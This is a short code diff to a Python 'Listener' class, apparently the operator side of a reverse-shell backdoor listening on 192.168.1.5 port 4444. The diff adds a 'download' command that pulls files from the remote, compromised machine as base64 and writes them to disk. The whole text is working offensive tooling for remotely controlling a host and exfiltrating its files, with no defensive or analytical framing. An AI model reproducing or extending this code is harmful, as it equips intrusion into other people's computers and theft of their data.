@@ -1,4 +1,4 @@
-import socket, json
+import socket, json, base64
 
 class Listener:
     def __init__(self,ip,port):
@@ -30,12 +30,21 @@ class Listener:
 
         return self.safe_receive()
     
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] File Was Download Successfuly"
+        
     def run(self):
         while True:
             command = input(">> ")
             command = command.split(" ")
             command_result = self.execute_commands(command)
-            print(command_result)
+            if command[0] == "download":
+                message = self.write_file(command[1], command_result)
+                print(message)
+            else:
+                print(command_result)
 
 my_listener = Listener("192.168.1.5", 4444)
 my_listener.run()
